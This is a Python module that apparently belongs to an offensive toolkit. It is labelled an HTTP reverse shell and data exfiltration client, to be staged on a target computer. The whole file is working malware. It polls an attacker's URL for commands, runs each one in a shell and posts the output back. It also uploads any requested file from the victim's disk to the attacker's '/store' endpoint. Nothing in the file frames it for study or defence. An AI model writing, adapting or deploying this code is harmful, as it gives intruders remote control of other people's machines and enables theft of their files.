import pyfiglet
from collections import OrderedDict
import requests 
import subprocess 
import os
import time

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'HTTP Data Exfiltration Client',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'Http reverse shell client',
            'Note':('To be stagged to target pc , for connecting to  Http reverse shell server'),
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('URL', ('http://127.0.0.1', True,'Address link')),
            ('RPORT', ('', True,'port'))
           
               
                ])
                }
    def logo(self):
    	title = 'Reverse shell'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set URL <address> | set RPORT <port>, then run")
   
   
    def execute(self):
        self.logo()
        URL = self.info['Options']['URL'][0]
        PORT = self.info['Options']['RPORT'][0]
        while True:
            req = requests.get(f'{URL}:{PORT}')#'http://10.0.2.15')
            command = req.text
            if 'terminate' in command:
                break # end the loop
            elif 'grab' in command:
                grab,path=command.split('*') 
                if os.path.exists(path):
                    url = f'{URL}/store'#'http://10.0.2.15/store'
                    files = {'file': open(path, 'rb')}
                    r = requests.post(url, files=files) 
                else:
                    post_response = requests.post(url=f'{URL}', data='[-] Not able to find the file !' )
            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                post_response = requests.post(url=f'{URL}', data=CMD.stdout.read() )
                post_response = requests.post(url=f'{URL}', data=CMD.stderr.read() )
            time.sleep(3)
        
        
        return f"[+] Waiting for Attacker ..."
    